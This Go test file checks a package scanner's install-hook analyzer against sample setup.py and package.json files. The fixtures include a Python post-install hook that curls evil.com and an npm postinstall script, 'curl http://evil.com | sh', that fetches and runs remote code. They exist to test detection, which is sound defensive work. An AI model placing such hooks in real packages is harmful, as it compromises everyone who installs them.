package builtin_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
	"github.com/cloudfieldcz/shieldoo-gate/internal/scanner/builtin"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// createTarball writes the given files into a temporary directory and returns
// the directory path (the Install Hook Analyzer reads individual files, not
// archives).
func createPkgDir(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, content := range files {
		full := filepath.Join(dir, name)
		require.NoError(t, os.MkdirAll(filepath.Dir(full), 0755))
		require.NoError(t, os.WriteFile(full, []byte(content), 0644))
	}
	return dir
}

func TestInstallHookAnalyzer_SuspiciousSetupPy_ReturnsSuspicious(t *testing.T) {
	dir := createPkgDir(t, map[string]string{
		"setup.py": `from setuptools import setup
import subprocess
class PostInstall:
    def run(self):
        subprocess.Popen(['curl', 'http://evil.com'])
setup(name='evil')
`,
	})

	s := builtin.NewInstallHookAnalyzer()
	result, err := s.Scan(context.Background(), scanner.Artifact{
		ID:        "evil-1.0.0",
		Ecosystem: scanner.EcosystemPyPI,
		Name:      "evil",
		Version:   "1.0.0",
		LocalPath: dir,
	})

	require.NoError(t, err)
	assert.Equal(t, scanner.VerdictSuspicious, result.Verdict)
	assert.NotEmpty(t, result.Findings)
}

func TestInstallHookAnalyzer_CleanSetupPy_ReturnsClean(t *testing.T) {
	dir := createPkgDir(t, map[string]string{
		"setup.py": `from setuptools import setup
setup(
    name='mypackage',
    version='1.0.0',
    packages=['mypackage'],
)
`,
	})

	s := builtin.NewInstallHookAnalyzer()
	result, err := s.Scan(context.Background(), scanner.Artifact{
		ID:        "mypackage-1.0.0",
		Ecosystem: scanner.EcosystemPyPI,
		Name:      "mypackage",
		Version:   "1.0.0",
		LocalPath: dir,
	})

	require.NoError(t, err)
	assert.Equal(t, scanner.VerdictClean, result.Verdict)
	assert.Empty(t, result.Findings)
}

func TestInstallHookAnalyzer_NPMPostinstall_ReturnsSuspicious(t *testing.T) {
	dir := createPkgDir(t, map[string]string{
		"package.json": `{
  "name": "evil-npm",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl http://evil.com | sh"
  }
}
`,
	})

	s := builtin.NewInstallHookAnalyzer()
	result, err := s.Scan(context.Background(), scanner.Artifact{
		ID:        "evil-npm-1.0.0",
		Ecosystem: scanner.EcosystemNPM,
		Name:      "evil-npm",
		Version:   "1.0.0",
		LocalPath: dir,
	})

	require.NoError(t, err)
	assert.Equal(t, scanner.VerdictSuspicious, result.Verdict)
	assert.NotEmpty(t, result.Findings)
}

func TestInstallHookAnalyzer_SupportedEcosystems(t *testing.T) {
	s := builtin.NewInstallHookAnalyzer()
	ecosystems := s.SupportedEcosystems()
	require.Len(t, ecosystems, 2)

	ecoSet := make(map[scanner.Ecosystem]bool)
	for _, e := range ecosystems {
		ecoSet[e] = true
	}
	assert.True(t, ecoSet[scanner.EcosystemPyPI])
	assert.True(t, ecoSet[scanner.EcosystemNPM])
}
